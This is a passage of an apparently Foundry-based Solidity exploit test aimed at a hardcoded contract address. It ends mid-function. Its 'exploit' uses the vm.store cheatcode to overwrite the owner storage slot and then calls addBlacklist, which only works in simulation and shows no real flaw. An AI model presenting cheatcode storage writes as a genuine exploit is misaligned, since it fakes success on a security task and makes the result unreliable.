contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting the owner storage slot
        // The Ownable contract stores owner at slot 0 (first variable)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Call addBlacklist as the new owner
        // No need for prank since we just made address(this) the owner
